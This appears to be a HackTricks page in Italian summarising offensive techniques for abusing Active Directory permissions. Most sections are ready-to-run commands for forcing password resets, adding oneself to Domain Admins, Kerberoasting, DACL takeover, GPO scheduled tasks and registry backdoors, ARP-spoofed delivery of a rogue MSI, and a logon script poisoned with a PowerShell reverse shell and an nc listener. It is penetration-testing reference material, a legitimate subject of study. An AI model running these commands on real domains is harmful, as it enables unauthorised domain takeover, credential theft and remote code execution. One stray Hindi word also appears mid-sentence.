# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Questa pagina è per lo più un riepilogo delle tecniche da** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **e** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Per maggiori dettagli, consulta gli articoli originali.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Questo privilegio concede a un attacker il pieno controllo su un account utente target. Una volta confermati i diritti `GenericAll` usando il comando `Get-ObjectAcl`, un attacker può:

- **Cambiare la password del target**: usando `net user <username> <password> /domain`, l'attacker può reimpostare la password dell'utente.
- Da Linux, puoi fare lo stesso tramite SAMR con Samba `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Se l'account è disabilitato, cancella il flag UAC**: `GenericAll` consente di modificare `userAccountControl`. Da Linux, BloodyAD può rimuovere il flag `ACCOUNTDISABLE`:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Assegna un SPN all'account dell'utente per renderlo kerberoastable, poi usa Rubeus e targetedKerberoast.py per estrarre e tentare di crackare gli hash del ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Disabilita la pre-authentication per l'utente, rendendo il suo account vulnerabile ad ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Con `GenericAll` su un user puoi aggiungere una credenziale basata su certificato e autenticarti come lui senza cambiare la sua password. Vedi:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Rights on Group**

Questo privilegio permette a un attacker di manipolare le membership dei group se ha diritti `GenericAll` su un group come `Domain Admins`. Dopo aver identificato il distinguished name del group con `Get-NetGroup`, l'attacker può:

- **Aggiungersi al Group Domain Admins**: Questo può essere fatto tramite comandi diretti o usando moduli come Active Directory o PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Da Linux puoi anche sfruttare BloodyAD per aggiungerti a gruppi arbitrari quando hai GenericAll/Write membership su di essi. Se il gruppo target è annidato in “Remote Management Users”, otterrai immediatamente accesso WinRM sugli host che riconoscono quel gruppo:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Avere questi privilegi su un oggetto computer o su un account user consente di:

- **Kerberos Resource-based Constrained Delegation**: Consente di prendere il controllo di un oggetto computer.
- **Shadow Credentials**: Usa questa tecnica per impersonare un computer o un account user sfruttando i privilegi per creare shadow credentials.

## **WriteProperty on Group**

Se un user ha privilegi `WriteProperty` su tutti gli oggetti per un gruppo specifico (ad es. `Domain Admins`), può:

- **Aggiungersi al gruppo Domain Admins**: Realizzabile combinando i comandi `net user` e `Add-NetGroupUser`, questo metodo consente privilege escalation all'interno del domain.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) su Group**

Questo privilegio consente agli attacker di aggiungersi a gruppi specifici, come `Domain Admins`, tramite comandi che manipolano direttamente la membership del gruppo. L’uso della seguente sequenza di comandi consente l’auto-aggiunta:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Un privilegio simile, questo consente agli attaccanti di aggiungersi direttamente ai gruppi modificando le proprietà del gruppo se hanno il diritto `WriteProperty` su quei gruppi. La verifica e l’esecuzione di questo privilegio vengono effettuate con:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Avere il `ExtendedRight` su un utente per `User-Force-Change-Password` consente di reimpostare le password senza conoscere quella attuale. La verifica di questo diritto e il suo sfruttamento possono essere eseguiti tramite PowerShell o strumenti alternativi da riga di comando, offrendo diversi metodi per reimpostare la password di un utente, incluse sessioni interattive e one-liner per ambienti non interattivi. I comandi vanno da semplici invocazioni PowerShell all'uso di `rpcclient` su Linux, dimostrando la versatilità dei vettori di attacco.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner su Group**

Se un attacker scopre di avere diritti `WriteOwner` su un group, può cambiare la ownership del group a sé stesso. Questo è particolarmente impattante quando il group in questione è `Domain Admins`, perché cambiare ownership permette un controllo più ampio sugli attributi e sulla membership del group. Il processo prevede l’identificazione del corretto object tramite `Get-ObjectAcl` e poi l’uso di `Set-DomainObjectOwner` per modificare l’owner, sia tramite SID sia tramite nome.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite su User**

Questo permesso consente a un attacker di modificare le proprietà dell'utente. In particolare, con accesso `GenericWrite`, l'attacker può cambiare il percorso del logon script di un utente per eseguire uno script malevolo al logon dell'utente. Questo si ottiene usando il comando `Set-ADObject` per aggiornare la proprietà `scriptpath` dell'utente target in modo che punti allo script dell'attacker.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite su Group**

Con questo privilegio, gli attacker possono manipolare l'appartenenza ai gruppi, ad esempio aggiungendo se stessi o altri utenti a gruppi specifici. Questo processo comporta la creazione di un oggetto credential, l'uso dello stesso per aggiungere o rimuovere utenti da un gruppo e la verifica delle modifiche di appartenenza con comandi PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Da Linux, Samba `net` può aggiungere/rimuovere membri quando hai `GenericWrite` sul gruppo (utile quando PowerShell/RSAT non sono disponibili):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Possedere un oggetto AD e avere privilegi `WriteDACL` su di esso consente a un attacker di concedersi privilegi `GenericAll` sull'oggetto. Questo viene ottenuto tramite la manipolazione ADSI, consentendo il pieno controllo dell'oggetto e la capacità di modificare le sue appartenenze ai gruppi. Nonostante ciò, esistono limitazioni quando si cerca di sfruttare questi privilegi usando i cmdlet `Set-Acl` / `Get-Acl` del modulo Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner quick takeover (PowerView)

Quando hai `WriteOwner` e `WriteDacl` su un user o service account, puoi prendere il pieno controllo e reimpostarne la password usando PowerView senza conoscere la vecchia password:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Note:
- Potrebbe essere necessario prima cambiare il proprietario a te stesso se hai solo `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Validate access with any protocol (SMB/LDAP/RDP/WinRM) after password reset.

## **Replication on the Domain (DCSync)**

L'attacco DCSync sfrutta permessi specifici di replicazione sul domain per mimare un Domain Controller e sincronizzare i dati, incluse le credenziali degli utenti. Questa tecnica potente richiede permessi come `DS-Replication-Get-Changes`, consentendo agli attacker di estrarre informazioni sensibili dall'ambiente AD senza accesso diretto a un Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

L'accesso delegato per gestire i Group Policy Objects (GPOs) può comportare rischi di sicurezza significativi. Per esempio, se a un user come `offense\spotless` vengono delegati diritti di gestione GPO, potrebbe avere privilegi come **WriteProperty**, **WriteDacl** e **WriteOwner**. Questi permessi possono essere abusati per scopi malevoli, come individuato usando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

Per identificare GPOs configurati in modo errato, i cmdlets di PowerSploit possono essere concatenati. Questo consente di scoprire i GPOs che un determinato user ha il permesso di gestire: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: È possibile risolvere quali computers a cui si applica un determinato GPO, aiutando a capire la portata del potenziale impatto. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Per vedere quali policies sono applicate a un particolare computer, si possono utilizzare comandi come `Get-DomainGPO`.

**OUs with a Given Policy Applied**: Identificare le organizational units (OUs) प्रभावित da una determinata policy può essere fatto usando `Get-DomainOU`.

Puoi anche usare lo strumento [**GPOHound**](https://github.com/cogiceo/GPOHound) per enumerare i GPOs e trovare problemi in essi.

### Abuse GPO - New-GPOImmediateTask

GPOs configurati in modo errato possono essere sfruttati per eseguire codice, per esempio creando un immediate scheduled task. Questo può essere fatto per aggiungere un user al gruppo local administrators sulle macchine interessate, elevando significativamente i privilegi:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Il modulo GroupPolicy, se installato, consente la creazione e il collegamento di nuovi GPO, e l'impostazione di preferenze come valori di registry per eseguire backdoor sui computer interessati. Questo metodo richiede che il GPO venga aggiornato e che un utente effettui l'accesso al computer per l'esecuzione:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse offre un metodo per abusare dei GPO esistenti aggiungendo task o modificando impostazioni senza bisogno di creare nuovi GPO. Questo strumento richiede la modifica di GPO esistenti oppure l'uso degli strumenti RSAT per crearne di nuovi prima di applicare le modifiche:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forza aggiornamento della policy

Gli aggiornamenti delle GPO avvengono in genere circa ogni 90 minuti. Per accelerare questo processo, soprattutto dopo aver implementato una modifica, il comando `gpupdate /force` può essere eseguito sul computer target per forzare un aggiornamento immediato della policy. Questo comando garantisce che eventuali modifiche alle GPO vengano applicate senza attendere il successivo ciclo di aggiornamento automatico.

### Sotto il cofano

Esaminando le Scheduled Tasks di una determinata GPO, come la `Misconfigured Policy`, si può confermare l'aggiunta di task come `evilTask`. Questi task vengono creati tramite script o strumenti da riga di comando con l'obiettivo di modificare il comportamento del sistema o elevare i privilegi.

La struttura del task, come mostrato nel file di configurazione XML generato da `New-GPOImmediateTask`, descrive i dettagli del task schedulato - incluso il comando da eseguire e i suoi trigger. Questo file rappresenta come i task schedulati vengono definiti e gestiti all'interno delle GPO, fornendo un metodo per eseguire comandi o script arbitrari come parte dell'applicazione della policy.

### Users and Groups

Le GPO consentono anche la manipolazione delle membership di utenti e gruppi sui sistemi target. Modificando direttamente i file di policy Users and Groups, gli attacker possono aggiungere utenti a gruppi privilegiati, come il gruppo locale `administrators`. Questo è possibile grazie alla delega dei permessi di gestione delle GPO, che consente la modifica dei file di policy per includere nuovi utenti o cambiare le membership dei gruppi.

Il file di configurazione XML per Users and Groups descrive come vengono implementate queste modifiche. Aggiungendo voci a questo file, utenti specifici possono ricevere privilegi elevati su tutti i sistemi interessati. Questo metodo offre un approccio diretto all'escalation dei privilegi tramite manipolazione delle GPO.

Inoltre, si possono considerare anche altri metodi per eseguire codice o mantenere persistenza, come sfruttare script di logon/logoff, modificare chiavi di registry per gli autorun, installare software tramite file .msi o modificare le configurazioni dei service. Queste tecniche offrono diverse strade per mantenere l'accesso e controllare i sistemi target tramite l'abuso delle GPO.

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` su una OU/domain ti permette di modificare l'attributo `gPLink` del container target e di **forzare l'applicazione di una GPO esistente** senza modificare la GPO stessa. Questo diventa interessante quando la GPO collegata fa già riferimento a contenuti remoti tramite **UNC paths** (`\\HOST\share\...`), perché gli authenticated users possono leggere **SYSVOL** e cercare policy riutilizzabili offline.

Workflow ad alto livello:

1. Usa BloodHound per identificare un principal con `WriteGPLink` su una OU ed enumerare computer/users all'interno di quella OU.
2. Clona `SYSVOL` in sola lettura e analizza le GPO alla ricerca di **Software Installation**, **drive mappings** (`Drives.xml`) e **logon/startup scripts** che facciano riferimento a UNC paths.
3. Preferisci policy che puntano a un **direct hostname** (per esempio `\\DC02\share\pkg.msi`) invece di path DFS/domain-namespace, perché i path basati su hostname sono più facili da reindirizzare con L2 spoofing.
4. Aggiungi il GUID della GPO scelta al `gPLink` della OU target, così la victim processa quella policy già esistente.
5. Nella stessa broadcast domain, fai ARP spoof dell'host UNC e associa localmente il suo IP (`ip addr add <target_ip>/32 dev <iface>`) così il traffico SMB della victim raggiunge il tuo host.
6. Esponi il path/nome file atteso da un attacker SMB server (per esempio `smbserver.py`) e attendi il normale processamento della policy.

Esempio di raccolta `SYSVOL` e correlazione delle GPO:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Collega il GPO esistente all'OU target:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Se il GPO collegato distribuisce un MSI da un percorso UNC, il client lo recupererà durante l'**avvio del computer** e lo installerà come **`NT AUTHORITY\SYSTEM`**. Spoofando l'host referenziato e servendo un MSI malevolo sotto lo **stesso share/path/name**, puoi trasformare `WriteGPLink` in esecuzione di codice come SYSTEM **senza modificare SYSVOL**.

Vincoli importanti:

- **Il timing conta**: il nuovo link viene visto al refresh della policy (di solito ~90 minuti), ma **Software Installation** di solito si attiva al **riavvio**.
- Windows Installer traccia comunemente la distribuzione usando il **`ProductCode`** del package. Se il prodotto è già installato, la distribuzione può essere saltata.
- Per evitare il rifiuto dell'installer, patcha il rogue MSI in modo che il suo **`ProductCode`** e **`PackageCode`** corrispondano al package legittimo atteso dal GPO.
- I vecchi file di advertisement `.aas` possono rimanere in `SYSVOL`, quindi verifica che la distribuzione sembri ancora attiva prima di farvi affidamento.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

Le mappature di unità GPP in `Drives.xml` causano gli utenti ad autenticarsi al percorso UNC configurato durante il logon o la riconnessione. Se falsifichi l’host referenziato, puoi catturare **NetNTLMv2**. Se SMB viene deliberatamente fatto fallire, Windows può riprovare tramite **WebDAV**, inviando **NTLM over HTTP**, che è molto più flessibile per relay verso **LDAP(S)**, **AD CS**, o **SMB**.

#### Logon/startup script UNC hijack

Lo stesso schema si applica agli script ospitati su UNC scoperti in `SYSVOL`:

- Gli **script di logon** di solito vengono eseguiti nel contesto **user**.
- Gli **script di startup** di solito vengono eseguiti nel contesto **computer / SYSTEM**.

Se il percorso dello script punta a un hostname falsificabile, reindirizza l’host UNC e servi il contenuto dello script sostitutivo dalla posizione prevista.

## SYSVOL/NETLOGON Logon Script Poisoning

Percorsi scrivibili sotto `\\<dc>\SYSVOL\<domain>\scripts\` o `\\<dc>\NETLOGON\` consentono di alterare gli script di logon eseguiti al logon dell’utente tramite GPO. Questo consente code execution nel contesto di sicurezza degli utenti che effettuano il logon.

### Locate logon scripts
- Ispeziona gli attributi utente per uno script di logon configurato:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Esplora le condivisioni del dominio per individuare shortcut o riferimenti a script:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Analizza i file `.lnk` per risolvere i target che puntano a SYSVOL/NETLOGON (trick utile per DFIR e per gli attacker senza accesso diretto a GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound mostra l'attributo `logonScript` (scriptPath) sui nodi utente quando presente.

### Valida l'accesso in scrittura (non fidarti degli elenchi di share)
Gli strumenti automatizzati possono mostrare SYSVOL/NETLOGON come sola lettura, ma le ACL NTFS sottostanti possono comunque consentire scritture. Verifica sempre:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
### Avvelena uno script di logon VBScript per RCE
Aggiungi un comando che avvia una reverse shell PowerShell (generala da revshells.com) e mantieni la logica originale per evitare di interrompere la funzionalità aziendale:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Ascolta sul tuo host e attendi il prossimo logon interattivo:
```bash
rlwrap -cAr nc -lnvp 443
```
Notes:
- L'esecuzione avviene sotto il token dell'utente che effettua il logging (non SYSTEM). L'ambito è il link GPO (OU, site, domain) che applica quello script.
- Fai cleanup ripristinando il contenuto/timestamp originali dopo l'uso.


## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
